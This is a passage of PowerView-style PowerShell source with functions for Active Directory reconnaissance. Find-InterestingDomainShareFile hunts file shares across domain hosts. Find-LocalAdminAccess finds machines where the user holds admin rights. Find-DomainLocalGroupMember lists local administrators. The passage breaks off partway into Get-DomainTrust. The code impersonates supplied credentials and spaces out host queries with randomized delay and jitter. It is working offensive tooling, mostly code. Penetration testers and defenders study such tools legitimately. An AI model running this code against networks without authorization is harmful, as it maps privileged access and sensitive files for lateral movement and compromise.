        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-InterestingDomainShareFile] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)

            if ($TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {

                $SearchShares = @()
                if ($TargetComputer.StartsWith('\\')) {
                    # if a share is passed as the server
                    $SearchShares += $TargetComputer
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                    if ($Up) {
                        # get the shares for this host and display what we find
                        $Shares = Get-NetShare -ComputerName $TargetComputer
                        ForEach ($Share in $Shares) {
                            $ShareName = $Share.Name
                            $Path = '\\'+$TargetComputer+'\'+$ShareName
                            # make sure we get a real share name back
                            if (($ShareName) -and ($ShareName.Trim() -ne '')) {
                                # skip this share if it's in the exclude list
                                if ($ExcludedShares -NotContains $ShareName) {
                                    # check if the user has access to this path
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $SearchShares += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ($Share in $SearchShares) {
                    Write-Verbose "Searching share: $Share"
                    $SearchArgs = @{
                        'Path' = $Share
                        'Include' = $Include
                    }
                    if ($OfficeDocs) {
                        $SearchArgs['OfficeDocs'] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        $SearchArgs['FreshEXEs'] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        $SearchArgs['LastAccessTime'] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        $SearchArgs['LastWriteTime'] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        $SearchArgs['CreationTime'] = $CreationTime
                    }
                    if ($CheckWriteAccess) {
                        $SearchArgs['CheckWriteAccess'] = $CheckWriteAccess
                    }
                    Find-InterestingFile @SearchArgs
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-InterestingDomainShareFile] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-InterestingDomainShareFile] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'Include' = $Include
                'ExcludedShares' = $ExcludedShares
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'TokenHandle' = $LogonToken
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-LocalAdminAccess {
<#
.SYNOPSIS

Finds machines on the local domain where the current user has local administrator access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Test-AdminAccess, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and for each computer it checks if the current user
has local administrator access using Test-AdminAccess. If -Credential is passed,
then Invoke-UserImpersonation is used to impersonate the specified user
before enumeration, reverting after with Invoke-RevertToSelf.

Idea adapted from the local_admin_search_enum post module in Metasploit written by:
    'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
    'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
    'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER CheckShareAccess

Switch. Only display found shares that the local user has access to.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-LocalAdminAccess

Finds machines in the current domain the current user has admin access to.

.EXAMPLE

Find-LocalAdminAccess -Domain dev.testlab.local

Finds machines in the dev.testlab.local domain the current user has admin access to.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-LocalAdminAccess -Domain testlab.local -Credential $Cred

Finds machines in the testlab.local domain that the user with the specified -Credential
has admin access to.

.OUTPUTS

String

Computer dnshostnames the current user has administrative access to.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-LocalAdminAccess] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-LocalAdminAccess] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $TokenHandle)

            if ($TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # check if the current user has local admin access to this server
                    $Access = Test-AdminAccess -ComputerName $TargetComputer
                    if ($Access.IsAdmin) {
                        $TargetComputer
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-LocalAdminAccess] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-LocalAdminAccess] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'TokenHandle' = $LogonToken
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainLocalGroupMember {
<#
.SYNOPSIS

Enumerates the members of specified local group (default administrators)
for all the targeted machines on the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetLocalGroupMember, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the members of the specified local
group (default of Administrators) for each machine using Get-NetLocalGroupMember.
By default, the API method is used, but this can be modified with '-Method winnt'
to use the WinNT service provider.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER GroupName

The local group name to query for users. If not given, it defaults to "Administrators".

.PARAMETER Method

The collection method to use, defaults to 'API', also accepts 'WinNT'.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainLocalGroupMember

Enumerates the local group memberships for all reachable machines in the current domain.

.EXAMPLE

Find-DomainLocalGroupMember -Domain dev.testlab.local

Enumerates the local group memberships for all reachable machines the dev.testlab.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainLocalGroupMember -Domain testlab.local -Credential $Cred

Enumerates the local group memberships for all reachable machines the dev.testlab.local
domain using the alternate credentials.

.OUTPUTS

PowerView.LocalGroupMember.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroupMember.WinNT

Custom PSObject with translated group property fields from WinNT results.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainLocalGroupMember] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainLocalGroupMember] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $GroupName, $Method, $TokenHandle)

            # Add check if user defaults to/selects "Administrators"
            if ($GroupName -eq "Administrators") {
                $AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if ($TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $NetLocalGroupMemberArguments = @{
                        'ComputerName' = $TargetComputer
                        'Method' = $Method
                        'GroupName' = $GroupName
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainLocalGroupMember] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-DomainLocalGroupMember] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'GroupName' = $GroupName
                'Method' = $Method
                'TokenHandle' = $LogonToken
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


########################################################
#
# Domain trust functions below.
#
########################################################

function Get-DomainTrust {
<#
.SYNOPSIS

Return all domain trusts for the current domain or a specified domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainSearcher, Get-DomainSID, PSReflect  

.DESCRIPTION

This function will enumerate domain trust relationships for the current (or a remote)
domain using a number of methods. By default, and LDAP search using the filter
'(objectClass=trustedDomain)' is used- if any LDAP-appropriate parameters are specified
LDAP is used as well. If the -NET flag is specified, the .NET method
GetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain
object. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is
used to enumerate instead.

.PARAMETER Domain

Specifies the domain to query for trusts, defaults to the current domain.

.PARAMETER API

Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the built-in
.NET methods.

.PARAMETER NET

Switch. Use .NET queries to enumerate trusts instead of the default LDAP method.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainTrust

Return domain trusts for the current domain using built in .LDAP methods.

.EXAMPLE

Get-DomainTrust -NET -Domain "prod.testlab.local"

Return domain trusts for the "prod.testlab.local" domain using .NET methods

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainTrust -Domain "prod.testlab.local" -Server "PRIMARY.testlab.local" -Credential $Cred

Return domain trusts for the "prod.testlab.local" domain enumerated through LDAP
queries, binding to the PRIMARY.testlab.local server for queries, and using the specified
alternate credenitals.

.EXAMPLE

Get-DomainTrust -API -Domain "prod.testlab.local"

Return domain trusts for the "prod.testlab.local" domain enumerated through API calls.

.OUTPUTS

PowerView.DomainTrust.LDAP

Custom PSObject with translated domain LDAP trust result fields (default).

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods.

PowerView.DomainTrust.API

Custom PSObject with translated domain API trust result fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $TrustAttributes = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }

        $LdapSearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $LdapSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $LdapSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['Properties']) { $LdapSearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $LdapSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $LdapSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $LdapSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $LdapSearcherArguments['ResultPageSize'] = $ResultPageSize }
